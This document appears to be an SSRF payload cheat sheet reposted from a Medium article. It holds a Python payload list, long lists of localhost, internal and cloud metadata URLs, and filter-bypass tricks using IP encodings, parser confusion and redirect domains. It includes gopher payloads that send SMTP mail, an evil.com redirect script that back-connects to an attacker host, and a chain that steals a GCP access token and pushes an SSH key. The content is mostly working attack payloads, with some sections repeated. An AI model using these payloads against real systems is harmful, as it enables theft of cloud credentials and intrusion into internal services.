
##
#
https://pravinponnusamy.medium.com/ssrf-payloads-f09b2a86a8b4
#
##



```
ssrf_payloads = [
    # Common URLs
    "http://example.com",
    "https://example.com",
    "http://localhost",
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://backfire.htb",
    
    # Internal IPs
    "http://169.254.169.254",  # AWS metadata service
    "http://metadata.google.internal",  # GCP metadata service
    "http://10.1.1.1",
    "http://192.168.0.1",
    "http://192.168.100.1",
    "http://192.168.1.254",
    "http://10.10.10.10",
    "http://172.16.0.10",
    
    # Common SSRF patterns
    "http://example.com/api?url=http://127.0.0.1:40056",
    "http://example.com/api?url=http://localhost:40056",
    "http://example.com/api?url=http://192.168.1.1",
    "http://example.com/api?url=http://169.254.169.254/latest/meta-data/",
    
    # Localhost and loopback addresses
    "http://localhost:40056",
    "http://127.0.0.1:40056",
    "http://0.0.0.0:40056",
    
    # Other protocols
    "ftp://127.0.0.1",
    "ftp://localhost",
    "file:///etc/passwd",  # Local file access
    "http://192.168.1.1:80",
    
    # Testing various HTTP methods
    "GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
    "POST /api/v1/resource HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
    
    # Testing with different ports
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:5000",
    
    # Testing with different paths
    "http://127.0.0.1/api/v1/users",
    "http://127.0.0.1/api/v1/status",
    "http://127.0.0.1/api/v1/commands",
    
    # Testing with various query parameters
    "http://127.0.0.1/api?url=http://example.com",
    "http://127.0.0.1/api?redirect=http://localhost",
    
    # Testing with invalid URLs
    "http://invalid-url",
    "http://256.256.256.256",
    "http://10.999.999.999",
    
    # Testing with different protocols
    "https://127.0.0.1",
    "http://[::1]",  # IPv6 localhost
    "http://[::ffff:127.0.0.1]",  # IPv6 mapped IPv4
    
    # Additional common services
    "http://127.0.0.1:9200",  # Elasticsearch
    "http://127.0.0.1:6379",  # Redis
    "http://127.0.0.1:3306",  # MySQL
    "http://127.0.0.1:5432",  # PostgreSQL
    "http://127.0.0.1:8081",  # Jenkins
    "http://127.0.0.1:5000",  # Flask app
    "http://127.0.0.1:8000",  # Django app
    
    # Testing with various internal services
    "http://127.0.0.1:3001/api/v1/data",
    "http://127.0.0.1:4000/api/v1/info",
    "http://127.0.0.1:5001/api/v1/execute",
    
    # Testing with different HTTP methods
    "PUT /api/v1/resource HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
    "DELETE /api/v1/resource HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
    
    # Testing with various payloads
    "http://127.0.0.1/api?url=http://example.com",
    "http://127.0.0.1/api?url=http://localhost",
    "http://127.0.0.1/api?url=http://192.168.1.1",
    "http://127.0.0.1/api?url=http://169.254.169.254",
    
    # Testing with file access
    "file:///etc/passwd",
    "file:///var/log/syslog",
    "file:///proc/self/environ",
    
    # Testing with local network addresses
    "http://192.168.1.100",
    "http://10.0.0.2",
    "http://172.16.0.5",
    
    # Testing with various protocols
    "ftp://127.0.0.1",
    "http://[::1]",  # IPv6 localhost
    "http://[::ffff:127.0.0.1]",  # IPv6 mapped IPv4
]

# things about life
for payload in ssrf_payloads:
    print(f"Testing payload: {payload}")
    # Here you would call your SSRF function with the payload

```
# And...

```
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
http://localhost:80
http://localhost:443
http://localhost:22
https://127.0.0.1/
https://localhost/
http://[::]:80/
http://[::]:25/
http://[::]:22/
http://[::]:3128/
http://0000::1:80/
http://0000::1:25/
http://0000::1:22/
http://0000::1:3128/
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network
127.0.0.1.nip.io
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
http://0177.0.0.1/
http://2130706433/
http://3232235521/
http://3232235777/
http://2852039166/
http://[0:0:0:0:0:ffff:127.0.0.1]
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
0://evil.com:80;http://google.com:80/ 
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
file:///etc/passwd
file://\/\/etc/passwd
ldap://localhost:11211/%0astats%0aquit
netdoc:///etc/passwd
http://instance-data
http://169.254.169.254
http://169.254.169.254.xip.io/
http://1ynrnhl.xip.io/
http://www.owasp.org.1ynrnhl.xip.io/
http://nicob.net/redir6a
http://nicob.net/redir-http-169.254.169.254:80-
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
http://localhost:9001/2018-06-01/runtime/invocation/next
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/openstack
http://169.254.169.254/2009-04-04/meta-data/ 
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
http://127.0.0.1:2379/version
http://127.0.0.1:2379/v2/keys/
http://127.0.0.1:2375/v1.24/containers/json
```




Basic SSRF v1

```
```
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
Basic SSRF — Alternative version

http://localhost:80
http://localhost:443
http://localhost:22
Advanced exploit using a redirection

1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
Advanced exploit using type=url

Change "type=file" to "type=url"
Paste URL in text field and hit enter
Using this vulnerability users can upload images from any image URL = trigger an SSRF
Bypassing filters
Bypass using HTTPS
https://127.0.0.1/
https://localhost/
Bypass localhost with [::]
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
Bypass localhost with a domain redirection
http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
The service nip.io is awesome for that, it will convert any ip address as a dns.

NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
Bypass localhost with CIDR
It’s a /8

http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
Bypass using a decimal IP location
http://0177.0.0.1/
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
Bypass using IPv6/IPv4 Address Embedding
IPv6/IPv4 Address Embedding

http://[0:0:0:0:0:ffff:127.0.0.1]
Bypass using malformed urls
localhost:+11211aaa
localhost:00011211aaaa
Bypass using rare address
You can short-hand IP addresses by dropping the zeros

http://0/
http://127.1
http://127.0.1
Bypass using bash variables
(curl only)

curl -v "http://evil$google.com"
$google = ""
Bypass using tricks combination
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
Bypass filter_var() php function
0://evil.com:80;http://google.com:80/
Bypass against a weak parser
by Orange Tsai (Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/

SSRF exploitation via URL Scheme
File
Allows an attacker to fetch the content of a file on the server

file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd
ssrf.php?url=file:///etc/passwd
HTTP
Allows an attacker to fetch any content from the web, it can also be used to scan ports.

ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443

The following URL scheme can be used to probe the network

Dict
The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:

dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
SFTP
A network protocol used for secure file transfer over secure shell

ssrf.php?url=sftp://evil.com:11111/
TFTP
Trivial File Transfer Protocol, works over UDP

ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
LDAP
Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.

ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
Gopher
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AH
You didn't say the magic word !
.
QUIT
Gopher HTTP
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
Gopher SMTP — Back connect to 1337
Content of evil.com/redirect.php:
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>
Now query it.
https://example.com/?q=http://evil.com/redirect.php.
Gopher SMTP — send a mail
Content of evil.com/redirect.php:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );
        $payload = implode('%0A', $commands);
        header('Location: gopher://0:25/_'.$payload);
?>
SSRF to XSS
by @D0rkerDevil & @alyssa.o.herrera

http://brutelogic.com.br/poc.svg -> simple alert
https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf
https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
SSRF URL for Cloud Instances
SSRF URL for AWS Bucket
Docs Interesting path to look for at http://169.254.169.254

Always here : /latest/meta-data/{hostname,public-ipv4,...}
User data (startup script for auto-scaling) : /latest/user-data
Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
DNS record

http://169.254.169.254
http://metadata.nicob.net/
http://169.254.169.254.xip.io/
http://1ynrnhl.xip.io/
http://www.owasp.org.1ynrnhl.xip.io/
HTTP redirect

Static:http://nicob.net/redir6a
Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
Alternate IP encoding

http://425.510.425.510/ Dotted decimal with overflow
http://2852039166/ Dotless decimal
http://7147006462/ Dotless decimal with overflow
http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
http://0xA9FEA9FE/ Dotless hexadecimal
http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
http://0251.0376.0251.0376/ Dotted octal
http://0251.00376.000251.0000376/ Dotted octal with padding
More urls to include

http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
E.g: Jira SSRF leading to AWS info disclosure — https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance

E.g2: Flaws challenge — http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/

SSRF URL for AWS Elastic Beanstalk
We retrieve the accountId and region from the API.

http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
We then retrieve the AccessKeyId, SecretAccessKey, and Token from the API.

http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role

Then we use the credentials with aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/.

SSRF URL for Google Cloud
Requires the header “Metadata-Flavor: Google” or “X-Google-Metadata-Request: True”

http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
Google allows recursive pulls

http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
Interesting files to pull out:

SSH Public Key : http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
Get Access Token : http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
Kubernetes Key : http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
Add an SSH key
Extract the token

http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
Check the scope of the token

$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  
{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
Now push the SSH key.

curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
SSRF URL for Digital Ocean
Documentation available at https://developers.digitalocean.com/documentation/metadata/

curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
All in one request:
curl http://169.254.169.254/metadata/v1.json | jq
SSRF URL for Packetcloud
Documentation available at https://metadata.packet.net/userdata

SSRF URL for Azure
Limited, maybe more exists? https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/

http://169.254.169.254/metadata/v1/maintenance

Update Apr 2017, Azure has more support; requires the header “Metadata: true” https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service

http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
SSRF URL for OpenStack/RackSpace
(header required? unknown)

http://169.254.169.254/openstack
SSRF URL for HP Helion
(header required? unknown)

http://169.254.169.254/2009-04-04/meta-data/
SSRF URL for Oracle Cloud
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
SSRF URL for Alibaba
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
SSRF URL for Kubernetes ETCD
Can contain API keys and internal ip and ports

curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
SSRF URL for Docker
http://127.0.0.1:2375/v1.24/containers/json
Simple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
SSRF URL for Rancher
curl http://rancher-metadata/<version>/<path>
